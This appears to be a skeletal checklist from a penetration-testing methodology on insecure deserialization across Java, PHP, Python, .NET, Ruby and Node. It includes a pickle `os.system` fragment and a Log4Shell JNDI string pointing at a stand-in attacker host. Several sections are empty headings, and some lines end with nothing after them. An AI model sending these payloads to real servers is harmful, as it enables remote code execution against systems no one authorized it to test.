# HUNT-DESERIALIZATION: Insecure Deserialization
- **Java ysoserial gadget chains**; CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection**; `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle**; `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter**; TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load**; Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection**; Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE
### Phase 1: Java Deserialization (ysoserial)
### Phase 2: PHP Object Injection
### Phase 3: Python Pickle
### Phase 3b: PHP phar://, Python YAML, Node deserialization
- **PHP phar:// (no `unserialize()` call)**; older PHP runtimes could automatically deserialize metadata through filesystem access. PHP 8 stopped that automatic behavior; explicit `getMetadata()` may still deserialize. Verify the exact version/call path.
- **Python `yaml.load()` (CVE-2017-18342)**; pre-5.1 default-unsafe:
- **Node `node-serialize` (CVE-2017-5941)**; IIFE marker in any field passed to `unserialize()`:
### Phase 4: .NET ViewState
### Phase 5: Log4Shell / JNDI
### Phase 6: Ruby Marshal
- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.